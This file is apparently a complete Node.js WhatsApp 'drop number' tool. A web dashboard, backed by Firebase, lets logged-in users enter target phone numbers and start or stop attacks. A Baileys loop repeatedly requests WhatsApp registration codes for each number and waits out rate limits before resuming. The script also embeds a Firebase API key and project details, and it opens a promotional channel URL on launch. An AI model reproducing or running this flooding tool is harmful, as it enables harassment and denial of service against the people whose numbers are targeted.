const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const http = require('http'); // Brought back the HTTP module

// 1. IMPORT FIREBASE ADMIN (Modern Modular Syntax)
const { initializeApp, cert } = require('firebase-admin/app');
const { getDatabase } = require('firebase-admin/database');
const serviceAccount = require('./serviceAccountKey.json');

// 2. INITIALIZE FIREBASE
const firebaseApp = initializeApp({
  credential: cert(serviceAccount),
  databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com"
});
const db = getDatabase(firebaseApp);


// Setup
if (!fs.existsSync('./files')) fs.mkdirSync('./files');
if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
`;

const spiderArt = `
    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
    ${color('        /        \\        ', ['#FF0000', '#200000'])}
    ${color('      /            \\      ', ['#FF0000', '#200000'])}
    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
    ${color('        \\________/        ', ['#FF0000', '#200000'])}
    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
    ${color('     /              \\     ', ['#FF0000', '#200000'])}
`;

// 3. THIS IS YOUR UPDATED HTML EMBEDDED DIRECTLY IN THE SCRIPT
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Creator Lord Tech | Professional Dashboard</title>
    <style>
        :root {
            --primary: #00ffcc;
            --bg-dark: #0a0a0c;
            --surface: #131418;
            --text-main: #ffffff;
            --text-muted: #888890;
            --danger: #ff4444;
        }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .dashboard-card {
            background-color: var(--surface);
            padding: 40px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            width: 380px;
            text-align: center;
        }
        h2 {
            margin-top: 0;
            font-weight: 600;
            letter-spacing: 1px;
            color: var(--primary);
        }
        p.subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: calc(100% - 24px);
            padding: 12px;
            margin: 8px 0;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            color: var(--text-main);
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: var(--primary);
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background-color: var(--primary);
            color: #000;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: background-color 0.2s, transform 0.1s;
        }
        button:hover {
            background-color: #00e6b8;
        }
        button:active {
            transform: scale(0.98);
        }
        .toggle-text {
            margin-top: 20px;
            font-size: 13px;
            color: var(--text-muted);
            cursor: pointer;
        }
        .toggle-text:hover {
            color: var(--primary);
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }
        .hidden {
            display: none;
        }

        /* Number List Styling */
        #numbers-list {
            list-style: none;
            padding: 0;
            margin: 15px 0 0 0;
            max-height: 180px;
            overflow-y: auto;
            text-align: left;
        }
        .number-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .btn-stop {
            background-color: var(--danger);
            color: #fff;
            width: auto;
            padding: 6px 12px;
            margin: 0;
            font-size: 12px;
        }
        .btn-start {
            background-color: var(--primary);
            color: #000;
            width: auto;
            padding: 6px 12px;
            margin: 0;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="dashboard-card">
        <h2>CREATOR LORD TECH</h2>
        <p class="subtitle" id="user-status">Authentication Required</p>

        <!-- Auth Section -->
        <div id="auth-section">
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button id="auth-btn">Log In</button>
            <div class="toggle-text" id="toggle-auth">Need an account? Sign Up</div>
        </div>

        <!-- Dashboard Section -->
        <div id="dashboard-section" class="hidden">
            <div style="display: flex; gap: 8px;">
                <input type="text" id="data-input" placeholder="Enter Phone Number" required>
                <button id="save-btn" style="width: 35%; margin-top: 8px;">Add</button>
            </div>

            <ul id="numbers-list"></ul>

            <button id="logout-btn" style="background-color: transparent; border: 1px solid var(--text-muted); color: var(--text-muted);">Log Out</button>
        </div>

        <div id="status"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { 
            getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { 
            getDatabase, ref, push, set, update, onValue, serverTimestamp 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCnLPPrYUgadNSpvCtOpY5-hxR-Oj9VRR4",
            authDomain: "botttt-90f17.firebaseapp.com",
            databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com",
            projectId: "botttt-90f17",
            storageBucket: "botttt-90f17.firebasestorage.app",
            messagingSenderId: "81533093740",
            appId: "1:81533093740:web:c538860b9245caa8d25549"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        const authSection = document.getElementById('auth-section');
        const dashSection = document.getElementById('dashboard-section');
        const authBtn = document.getElementById('auth-btn');
        const toggleAuth = document.getElementById('toggle-auth');
        const statusDiv = document.getElementById('status');
        const userStatus = document.getElementById('user-status');
        const logoutBtn = document.getElementById('logout-btn');
        const saveBtn = document.getElementById('save-btn');
        const numbersList = document.getElementById('numbers-list');

        let isLogin = true;
        let currentUser = null;

        toggleAuth.addEventListener('click', () => {
            isLogin = !isLogin;
            authBtn.textContent = isLogin ? "Log In" : "Sign Up";
            toggleAuth.textContent = isLogin ? "Need an account? Sign Up" : "Already have an account? Log In";
        });

        const showMessage = (msg, color = "var(--primary)") => {
            statusDiv.textContent = msg;
            statusDiv.style.color = color;
            setTimeout(() => statusDiv.textContent = "", 3000);
        };

        authBtn.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if(!email || !password) return showMessage("Please fill all fields", "var(--danger)");

            try {
                if (isLogin) {
                    await signInWithEmailAndPassword(auth, email, password);
                } else {
                    await createUserWithEmailAndPassword(auth, email, password);
                }
            } catch (error) {
                showMessage(error.message.replace("Firebase:", ""), "var(--danger)");
            }
        });

        logoutBtn.addEventListener('click', () => signOut(auth));

        saveBtn.addEventListener('click', async () => {
            const dataInput = document.getElementById('data-input').value.trim();
            if(!dataInput || !currentUser) return;

            try {
                const userRef = ref(db, \`users/\${currentUser.uid}/numbers\`);
                const newRef = push(userRef);
                await set(newRef, {
                    number: dataInput,
                    status: "active",
                    timestamp: serverTimestamp()
                });
                showMessage("Number added successfully!");
                document.getElementById('data-input').value = "";
            } catch (error) {
                showMessage("Error saving data.", "var(--danger)");
            }
        });

        const loadUserNumbers = (uid) => {
            const userNumbersRef = ref(db, \`users/\${uid}/numbers\`);
            onValue(userNumbersRef, (snapshot) => {
                numbersList.innerHTML = "";
                const data = snapshot.val();
                if (!data) return;

                Object.entries(data).forEach(([key, item]) => {
                    const li = document.createElement('li');
                    li.className = "number-item";
                    
                    const isStopped = item.status === 'stopped';
                    
                    li.innerHTML = \`
                        <span>\${item.number} <small style="color:\${isStopped ? 'var(--danger)' : 'var(--primary)'}">(\${item.status})</small></span>
                        <button class="\${isStopped ? 'btn-start' : 'btn-stop'}" onclick="toggleStatus('\${key}', '\${item.status}')">
                            \${isStopped ? 'Start' : 'Stop'}
                        </button>
                    \`;
                    numbersList.appendChild(li);
                });
            });
        };

        window.toggleStatus = async (key, currentStatus) => {
            if (!currentUser) return;
            const newStatus = currentStatus === 'stopped' ? 'active' : 'stopped';
            try {
                await update(ref(db, \`users/\${currentUser.uid}/numbers/\${key}\`), {
                    status: newStatus
                });
                showMessage(\`Number \${newStatus}\`);
            } catch (err) {
                showMessage("Failed to update status", "var(--danger)");
            }
        };

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            if (user) {
                authSection.classList.add('hidden');
                dashSection.classList.remove('hidden');
                userStatus.textContent = \`Welcome, \${user.email}\`;
                loadUserNumbers(user.uid);
            } else {
                authSection.classList.remove('hidden');
                dashSection.classList.add('hidden');
                userStatus.textContent = "Authentication Required";
                document.getElementById('email').value = "";
                document.getElementById('password').value = "";
                numbersList.innerHTML = "";
            }
        });
    </script>
</body>
</html>
`;

// 4. MAP TO CONTROL ACTIVE LOOPS
const activeTasks = new Map();

const start = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;
    exec(openCmd);

    console.log(masterBanner);
    console.log(spiderArt);
    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    // 5. DROP NUMBER FUNCTION (Loops while task is true)
    const dropNumber = async (taskId, phoneNumber) => {
        const ddi = phoneNumber.substring(0, 2); 
        const number = phoneNumber.substring(2);

        while (activeTasks.get(taskId) === true) {
            try {
                console.clear();
                console.log(masterBanner);
                console.log(spiderArt);
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
                console.log(color(`  [+] TARGET NUMBER : +${phoneNumber}  `, ['#FF0000', '#FFFFFF']));
                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));

                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    await new Promise(r => setTimeout(r, res.retry_after * 1000));
                }
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
        console.log(color(`\n[!] PROCESS HALTED FOR: +${phoneNumber}`, ['#FF0000', '#FFFFFF']));
    };

    // 6. FIREBASE LISTENER (Checks when you press Start/Stop on the web)
    const usersRef = db.ref('users');
    const processUserSnapshot = (snapshot) => {
        const userData = snapshot.val();
        if (!userData || !userData.numbers) return;

        Object.entries(userData.numbers).forEach(([taskId, item]) => {
            const { number, status } = item;

            if (status === 'stopped') {
                if (activeTasks.get(taskId) === true) {
                    activeTasks.set(taskId, false); // Stops the loop
                }
            } else if (status === 'active') {
                if (activeTasks.get(taskId) !== true) {
                    activeTasks.set(taskId, true); // Starts the loop
                    dropNumber(taskId, number);
                }
            }
        });
    };

    usersRef.on('child_added', processUserSnapshot);
    usersRef.on('child_changed', processUserSnapshot);

    // 7. BRING BACK THE LOCAL SERVER TO SERVE THE HTML
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/') {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(dashboardHTML);
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(3000, () => {
        console.log(color('\n ► SERVER RUNNING! Open http://localhost:3000 in your browser to enter numbers.', ['#00FF00', '#FFFFFF']));
    });
};

start();
